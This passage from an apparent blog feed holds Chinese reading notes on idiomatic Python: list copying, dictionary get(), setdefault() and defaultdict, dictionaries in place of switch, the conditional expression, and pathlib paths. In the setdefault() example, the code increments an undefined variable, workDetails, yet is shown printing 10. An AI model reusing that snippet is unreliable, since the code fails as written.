class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>　　注意，<code>spam</code>和<code>eggs</code>指向的列表对象的身份是不同的。<code>eggs = spam[:]</code>创建了<code>spam</code>列表的浅副本。而<code>eggs = spam</code>只复制了列表的引用。<code>[:]</code>这种写法看起来有些奇怪，而使用<code>copy</code>模块的<code>copy()</code>函数创建列表的浅副本会有更好的可读性：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> copy</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;rat&#x27;</span>, <span class="hljs-string">&#x27;eel&#x27;</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">eggs = copy.copy(spam)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(spam) == <span class="hljs-built_in">id</span>(eggs)</span><br>False<br></code></pre></td></tr></table></figure><p>你应该了解这个奇怪的语法，以避免在读到这样的Python代码时感到费解，但我不建议在代码中使用它，因为<code>[:]</code>和<code>copy.copy()</code>都能创建浅副本。</p><h2 id="6-7-以Python风格使用字典"><a href="#6-7-以Python风格使用字典" class="headerlink" title="6.7　以Python风格使用字典"></a>6.7　以Python风格使用字典</h2><p>　　字典的键−值对（第7章将进一步讨论）可以维护一份数据到另一份数据的映射，这种灵活性使其成为很多Python程序的常用数据类型。因此，了解Python代码中常用的字典用法大有益处。</p><p>　　如果想进一步了解字典，可以参考Brandon Rhodes的关于什么是字典，以及它如何工作的演讲。他在PyCon大会上所做的“The Mighty Dictionary”（强大的字典）和“The Dictionary Even Mightier”（更强大的字典）演讲应该对你有所帮助。</p><h3 id="6-7-1-在字典中使用get-和setdefault"><a href="#6-7-1-在字典中使用get-和setdefault" class="headerlink" title="6.7.1　在字典中使用get()和setdefault()"></a>6.7.1　在字典中使用<code>get()</code>和<code>setdefault()</code></h3><p>　　试图访问一个不存在的字典键会导致<code>KeyError</code>。为了避免它，程序员经常会写出一些不符合Python风格的代码，比如这样：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># 不符合Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numberOfPets = &#123;<span class="hljs-string">&#x27;dogs&#x27;</span>: <span class="hljs-number">2</span>&#125;</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;cats&#x27;</span> <span class="hljs-keyword">in</span> numberOfPets: <span class="hljs-comment"># 检查其中是否有cats键</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;I have&#x27;</span>, numberOfPets[<span class="hljs-string">&#x27;cats&#x27;</span>], <span class="hljs-string">&#x27;cats.&#x27;</span>)</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-keyword">else</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;I have 0 cats.&#x27;</span>)</span><br><span class="hljs-meta prompt_">...</span><br>I have 0 cats.<br></code></pre></td></tr></table></figure><p>这段代码检查<code>numberOfPets</code>字典中是否存在一个为字符串“cats”的键。如果存在，<code>print()</code>调用会获取<code>numberOfPets[&#39;cats&#39;]</code>的值作为信息的一部分展示给用户。如果不存在，另一个<code>print()</code>调用不会访问<code>numberOfPets[&#39;cats&#39;]</code>，而是展示其他字符串，这样就不会显示<code>KeyError</code>。</p><p>　　由于这种代码模式很常见，因此字典提供了<code>get()</code>方法，允许当键不存在的时候返回指定的默认值。下面这段Python风格的代码跟前面的代码功效相同：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numberOfPets = &#123;<span class="hljs-string">&#x27;dogs&#x27;</span>: <span class="hljs-number">2</span>&#125;</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;I have&#x27;</span>, numberOfPets.get(<span class="hljs-string">&#x27;cats&#x27;</span>, <span class="hljs-number">0</span>), <span class="hljs-string">&#x27;cats.&#x27;</span>)</span><br>I have 0 cats.<br></code></pre></td></tr></table></figure><p><code>numberOfPets.get(&#39;cats&#39;, 0)</code>这个调用会检查<code>numberOfPets</code>字典是否存在<code>&#39;cats&#39;</code>键。如果存在，该方法返回<code>&#39;cats&#39;</code>键对应的值，如果不存在则返回第二个参数，也就是<code>0</code>。使用<code>get()</code>方法指定键不存在时返回的默认值，要比使用<code>if-else</code>语句简单明了。</p><p>　　另一种情况是，当键不存在时，为其设置默认值。如果字典<code>numberOfPets</code>没有<code>&#39;cats&#39;</code>键，<code>numberOfPets[&#39;cats&#39;] += 10</code>会导致<code>KeyError</code>。你可能想预先检查键是否缺失，如果缺失则为其设置默认值：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># 不符合Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numberOfPets = &#123;<span class="hljs-string">&#x27;dogs&#x27;</span>: <span class="hljs-number">2</span>&#125;</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;cats&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> numberOfPets:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    numberOfPets[<span class="hljs-string">&#x27;cats&#x27;</span>] = <span class="hljs-number">0</span></span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numberOfPets[<span class="hljs-string">&#x27;cats&#x27;</span>] += <span class="hljs-number">10</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numberOfPets[<span class="hljs-string">&#x27;cats&#x27;</span>]</span><br>10<br></code></pre></td></tr></table></figure><p>这种模式也很常见，字典提供了一个符合Python风格的<code>setdefault()</code>方法。下面这段代码与前一段等效：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numberOfPets = &#123;<span class="hljs-string">&#x27;dogs&#x27;</span>: <span class="hljs-number">2</span>&#125;</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numberOfPets.setdefault(<span class="hljs-string">&#x27;cats&#x27;</span>, <span class="hljs-number">0</span>) <span class="hljs-comment"># 如果&#x27;cats&#x27;键存在，则什么也不做</span></span><br>0<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">workDetails[<span class="hljs-string">&#x27;cats&#x27;</span>] += <span class="hljs-number">10</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">workDetails[<span class="hljs-string">&#x27;cats&#x27;</span>]</span><br>10<br></code></pre></td></tr></table></figure><p>如果你还在用<code>if</code>语句检查字典中是否存在某个键，在键不存在时设置默认值，请使用<code>setdefault()</code>代替。</p><h3 id="6-7-2-使用collections-defaultdict-设置默认值"><a href="#6-7-2-使用collections-defaultdict-设置默认值" class="headerlink" title="6.7.2　使用collections.defaultdict()设置默认值"></a>6.7.2　使用<code>collections.defaultdict()</code>设置默认值</h3><p>　　使用<code>collections.defaultdict()</code>可以彻底避免<code>KeyError</code>。导入<code>collections</code>模块并调用<code>collections.defaultdict()</code>，传递数据类型作为默认值，就可以创建一个默认的字典。比如，通过向<code>collections.defaultdict()</code>传递<code>int</code>可以创建一个类似字典的对象，当键不存在时，使用0作为默认值。在交互式shell中输入以下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> collections<br><span class="hljs-meta">&gt;&gt;&gt; </span>scores = collections.defaultdict(<span class="hljs-built_in">int</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>scores<br>defaultdict(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &#123;&#125;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>scores[<span class="hljs-string">&#x27;Al&#x27;</span>] += <span class="hljs-number">1</span> <span class="hljs-comment"># 不需要提前设置&#x27;Al&#x27;键的值</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>scores<br>defaultdict(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &#123;<span class="hljs-string">&#x27;Al&#x27;</span>: <span class="hljs-number">1</span>&#125;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>scores[<span class="hljs-string">&#x27;Zophie&#x27;</span>] <span class="hljs-comment"># 不需要提前设置&#x27;Zophie&#x27;键的值</span><br><span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>scores[<span class="hljs-string">&#x27;Zophie&#x27;</span>] += <span class="hljs-number">40</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>scores<br>defaultdict(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &#123;<span class="hljs-string">&#x27;Al&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;Zophie&#x27;</span>: <span class="hljs-number">40</span>&#125;)<br></code></pre></td></tr></table></figure><p>注意，你是在传递<code>int()</code>函数，而不是调用它，所以要省略<code>int()</code>中的括号。正确的写法是<code>collections.defaultdict(int)</code>。也可以传递<code>list</code>，使用空列表作为默认值。在交互式shell中输入以下内容：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> collections</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">booksReadBy = collections.defaultdict(<span class="hljs-built_in">list</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">booksReadBy[<span class="hljs-string">&#x27;Al&#x27;</span>].append(<span class="hljs-string">&#x27;Oryx and Crake&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">booksReadBy[<span class="hljs-string">&#x27;Al&#x27;</span>].append(<span class="hljs-string">&#x27;American Gods&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">len</span>(booksReadBy[<span class="hljs-string">&#x27;Al&#x27;</span>])</span><br>2<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">len</span>(booksReadBy[<span class="hljs-string">&#x27;Zophie&#x27;</span>]) <span class="hljs-comment"># 默认值是一个空列表</span></span><br>0<br></code></pre></td></tr></table></figure><p>如果需要对任意一个键设置默认值，使用<code>collections.defaultdict()</code>要比使用常规字典再反复调用<code>setdefault()</code>方便得多。</p><h3 id="6-7-3-使用字典代替switch语句"><a href="#6-7-3-使用字典代替switch语句" class="headerlink" title="6.7.3　使用字典代替switch语句"></a>6.7.3　使用字典代替<code>switch</code>语句</h3><p>Java之类的语言有<code>switch</code>语句，与<code>if-elif-else</code>类似，用来根据变量是多个可能值中的哪一个来执行不同的代码。Python没有<code>switch</code>语句，所以Python程序员有时会写出下面这个示例中的代码。这段代码根据<code>season</code>变量的不同值来执行不同的赋值语句。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 下列if和elif条件语句中都有“season ==”：</span><br><span class="hljs-keyword">if</span> season == <span class="hljs-string">&#x27;Winter&#x27;</span>:<br>    holiday = <span class="hljs-string">&#x27;New Year\&#x27;s Day&#x27;</span><br><span class="hljs-keyword">elif</span> season == <span class="hljs-string">&#x27;Spring&#x27;</span>:<br>    holiday = <span class="hljs-string">&#x27;May Day&#x27;</span><br><span class="hljs-keyword">elif</span> season == <span class="hljs-string">&#x27;Summer&#x27;</span>:<br>    holiday = <span class="hljs-string">&#x27;Juneteenth&#x27;</span><br><span class="hljs-keyword">elif</span> season == <span class="hljs-string">&#x27;Fall&#x27;</span>:<br>    holiday = <span class="hljs-string">&#x27;Halloween&#x27;</span><br><span class="hljs-keyword">else</span>:<br>    holiday = <span class="hljs-string">&#x27;Personal day off&#x27;</span><br></code></pre></td></tr></table></figure><p>这段代码符合Python风格，但是有点啰唆。Java的<code>switch</code>语句默认会有fall-through特性，如果块不用<code>break</code>语句结束，就会继续执行下一个块。忘记添加<code>break</code>语句是个常见的错误来源。这个Python示例中所有<code>if-elif</code>语句的功能都比较类似，对于这种情况，一些Python程序员更喜欢通过字典来做这种工作。下面这段简洁的代码与上一个示例功效一致：</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sml">holiday = &#123;<span class="hljs-symbol">&#x27;Winter&#x27;</span>: <span class="hljs-symbol">&#x27;New</span> <span class="hljs-type">Year</span>\<span class="hljs-symbol">&#x27;s</span> <span class="hljs-type">Day&#x27;</span>,<br>           <span class="hljs-symbol">&#x27;Spring&#x27;</span>: <span class="hljs-symbol">&#x27;May</span> <span class="hljs-type">Day&#x27;</span>,<br>           <span class="hljs-symbol">&#x27;Summer&#x27;</span>: <span class="hljs-symbol">&#x27;Juneteenth&#x27;</span>,<br>           <span class="hljs-symbol">&#x27;Fall&#x27;</span>:   <span class="hljs-symbol">&#x27;Halloween&#x27;</span>&#125;.get(season, <span class="hljs-symbol">&#x27;Personal</span> day off&#x27;)<br></code></pre></td></tr></table></figure><p>这段代码只是一个简单的赋值语句。<code>holiday</code>中存储的值是<code>get()</code>方法调用的结果。如果字典中存在<code>season</code>的值对应的键，则返回对应的值，不存在时则返回<code>&#39;Personal day off&#39;</code>。使用字典会让代码更加简洁，但也可能降低可读性。所以，是否使用这种习惯用法取决于你。</p><h2 id="6-8-条件表达式：Python“丑陋”的三元运算符"><a href="#6-8-条件表达式：Python“丑陋”的三元运算符" class="headerlink" title="6.8　条件表达式：Python“丑陋”的三元运算符"></a>6.8　条件表达式：Python“丑陋”的三元运算符</h2><p>　　<strong>三元运算符</strong>（在Python中的正式说法是<strong>条件表达式</strong>，有时也被称为<strong>三元选择表达式</strong>）是根据条件将某个表达式推导为两个值中的某一个值。通常，它是使用Python风格的<code>if-else</code>语句实现的：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">condition = <span class="hljs-literal">True</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">if</span> condition:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    message = <span class="hljs-string">&#x27;Access granted&#x27;</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-keyword">else</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    message = <span class="hljs-string">&#x27;Access denied&#x27;</span></span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">message</span><br>&#x27;Access granted&#x27;<br></code></pre></td></tr></table></figure><p>　　“三元”的本意是运算符有3个输入，但它在编程中的含义类似于条件表达式。条件表达式也能为这种模式提供一个更简洁的一行代码版本。在Python中，它们是通过关键字<code>if</code>和<code>else</code>的奇特组合实现的：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">valueIfTrue = <span class="hljs-string">&#x27;Access granted&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">valueIfFalse = <span class="hljs-string">&#x27;Access denied&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">condition = <span class="hljs-literal">True</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">message = valueIfTrue <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> valueIfFalse ❶</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">message</span><br>&#x27;Access granted&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(valueIfTrue <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> valueIfFalse) ❷</span><br>&#x27;Access granted&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">condition = <span class="hljs-literal">False</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">message = valueIfTrue <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> valueIfFalse</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">message</span><br>&#x27;Access denied&#x27;<br></code></pre></td></tr></table></figure><p><code>valueIfTrue if condition else valueIfFalse</code>❶这段表达式在<code>condition</code>值为<code>True</code>时结果为<code>valueIfTrue</code>，在<code>condition</code>值为<code>False</code>时值为<code>valueIfFalse</code>。Guido van Rossum开玩笑地将这种语法设计称作“故意的丑陋”。大多数语言的三元运算符是先列出条件，之后再是条件为真时的值和条件为假时的值。任何使用表达式或者值的地方都可以使用条件表达式，包括作为函数调用的参数❷。</p><p>　　为什么Python会在2.5版本中引入这种语法，即使违背了“美丽胜于丑陋”这条准则？因为虽然这种写法可读性不强，但很多程序员使用三元运算符，并希望Python也支持这种语法。巧用布尔运算符的短路运算可以创建一种三元运算符。表达式<code>condition and valueIfTrue or valueIfFalse</code>，在<code>condition</code>为<code>True</code>时结果为<code>valueIfTrue</code>，反之为<code>valueIfFalse</code>（实际上有一重要的例外，下面会讲到）。在交互式shell中输入以下内容：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># 不符合Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">valueIfTrue = <span class="hljs-string">&#x27;Access granted&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">valueIfFalse = <span class="hljs-string">&#x27;Access denied&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">condition = <span class="hljs-literal">True</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">condition <span class="hljs-keyword">and</span> valueIfTrue <span class="hljs-keyword">or</span> valueIfFalse</span><br>&#x27;Access granted&#x27;<br></code></pre></td></tr></table></figure><p>这种<code>condition and valueIfTrue or valueIfFalse</code>风格的伪三元运算符有一个不易察觉的错误：如果<code>valueIfTrue</code>是一个假值（如<code>0</code>、<code>False</code>、<code>None</code>或空白字符串），即使条件为<code>True</code>，表达式的结果还是会为<code>valueIfFalse</code>。但这种伪三元运算符还在被程序员使用。“为什么Python没有三元运算符？”这是Python核心开发者经常被问到的问题。条件表达式的出现就是为了响应程序员想要三元运算符的呼声，避免程序员继续使用容易出错的伪三元运算符。但程序员也不愿意使用“丑陋”的条件运算符。尽管“美丽胜于丑陋”，但“实用性胜于纯粹性”，这就是Python“丑陋的三元运算符”体现的价值。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】读书笔记之代码的坏味道（五）</title>
    <link href="/2024/01/03/615python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BB%A3%E7%A0%81%E7%9A%84%E5%9D%8F%E5%91%B3%E9%81%93%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2024/01/03/615python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BB%A3%E7%A0%81%E7%9A%84%E5%9D%8F%E5%91%B3%E9%81%93%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-读书笔记之代码的坏味道"><a href="#Python-读书笔记之代码的坏味道" class="headerlink" title="Python 读书笔记之代码的坏味道"></a>Python 读书笔记之代码的坏味道</h1><h1 id="2-、文件系统"><a href="#2-、文件系统" class="headerlink" title="2 、文件系统"></a>2 、文件系统</h1><p>2.1.1文件系统</p><p>在Windows上，文件夹和文件名使用反斜杠（\）分隔；在macOS和Linux上，则是使用正斜杠（&#x2F;）分隔。为了使Python脚本跨平台兼容，可以使用<code>pathlib</code>模块和<code>/</code>运算符。</p><p>导入<code>pathlib</code>的典型方法是使用语句<code>from pathlib import Path</code>。因为<code>Path</code>是<code>pathlib</code>中最常用的类，所以使用这种形式导入可以让你在后续只需要输入<code>Path</code>，而不是<code>pathlib.Path</code>。在表达式最左边输入一个<code>Path</code>对象，在后面使用<code>/</code>把<code>Path</code>对象或字符串连接成一条完整路径。在交互式shell中输入以下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from pathlib import Path</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Path(<span class="hljs-string">&#x27;spam&#x27;</span>) / <span class="hljs-string">&#x27;bacon&#x27;</span> / <span class="hljs-string">&#x27;eggs&#x27;</span></span><br>WindowsPath(&#x27;spam/bacon/eggs&#x27;)<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Path(<span class="hljs-string">&#x27;spam&#x27;</span>) / Path(<span class="hljs-string">&#x27;bacon/eggs&#x27;</span>)</span><br>WindowsPath(&#x27;spam/bacon/eggs&#x27;)<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Path(<span class="hljs-string">&#x27;spam&#x27;</span>) / Path(<span class="hljs-string">&#x27;bacon&#x27;</span>, <span class="hljs-string">&#x27;eggs&#x27;</span>)</span><br>WindowsPath(&#x27;spam/bacon/eggs&#x27;)<br></code></pre></td></tr></table></figure><p>请注意，因为我是在Windows机器上运行这段代码的，所以<code>Path</code>返回了<code>WindowsPath</code>对象。而在macOS和Linux上则会返回<code>PosixPath</code>对象。（POSIX是类Unix操作系统的一组标准，关于它的内容不在本书讨论范围内。）对我们而言，无须理解两者的区别。</p><p>　　可以将<code>Path</code>对象传递给Python标准库中任何一个以文件名作为参数的函数。例如，函数调用<code>open(Path(&#39;C:\\&#39;) / &#39;Users&#39; / &#39;Al&#39; / &#39;Desktop&#39; / &#39;spam.py&#39;)</code>等同于<code>open(r&#39;C:\Users\Al\ Desktop\spam.py&#39;)</code>。</p><h3 id="2-1-2主目录"><a href="#2-1-2主目录" class="headerlink" title="2.1.2主目录"></a>2.1.2主目录</h3><p>所有用户在计算机上都有一个被称为<strong>主目录</strong>或<strong>主文件夹</strong>的文件夹，用于存放该用户自己的文件。可以通过调用<code>Path.home()</code>来获取主目录的<code>Path</code>对象。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Path.home()</span><br>WindowsPath(&#x27;C:/Users/Al&#x27;)<br></code></pre></td></tr></table></figure><p>主目录的位置取决于操作系统。</p><ul><li>在Windows上，主目录位于C:\Users下。</li><li>在macOS上，主目录位于&#x2F;Users下。</li><li>在Linux上，主目录通常位于&#x2F;home下。</li></ul><h2 id="2-1-3-当前工作目录"><a href="#2-1-3-当前工作目录" class="headerlink" title="2.1.3 当前工作目录"></a>2.1.3 当前工作目录</h2><p>计算机运行的每个程序都有自己的<strong>当前工作目录</strong>（英文为cwd，是current working directory的首字母缩写）。任何不以根目录开头的文件名或路径都是相对于当前工作目录而言的相对路径。尽管“目录”是“文件夹”的过时说法，但“当前工作目录”（也可以简称为工作目录）是标准术语，不能使用“当前工作文件夹”代替。</p><p>可以使用<code>Path.cwd()</code>函数将cwd作为一个<code>Path</code>对象来获取，并使用<code>os.chdir()</code>修改它。在交互式shell中输入以下内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from pathlib import Path</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import os</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Path.cwd() ❶</span><br>WindowsPath(&#x27;C:/Users/Al/AppData/Local/Programs/Python/Python38&#x27;)<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; os.chdir(<span class="hljs-string">&#x27;C:\\Windows\\System32&#x27;</span>) ❷</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Path.cwd()</span><br>WindowsPath(&#x27;C:/Windows/System32&#x27;)<br></code></pre></td></tr></table></figure><p>在这段代码中，cwd被设置为<code>C:\Users\Al\AppData\Local\Programs\Python\Python38</code>❶，所以文件名project.docx实际指向C:\Users\Al\AppData\Local\Programs\Python\Python38\project.docx。如果把cwd修改为C:\Windows\System32❷，文件名project.docx则指向C:\Windows\System32\project.docx。</p><p>在<code>pathlib</code>模块出现之前，人们常使用<code>os</code>模块中的<code>os.getcwd()</code>函数获取cwd路径字符串</p><h3 id="2-1-4-绝对路径和相对路径"><a href="#2-1-4-绝对路径和相对路径" class="headerlink" title="2.1.4　绝对路径和相对路径"></a>2.1.4　绝对路径和相对路径</h3><p>指定文件路径有两种方法。</p><ul><li>绝对路径，是以根目录为起点的路径</li><li>相对路径，是相对于程序的当前工作目录的路径</li></ul><p>　　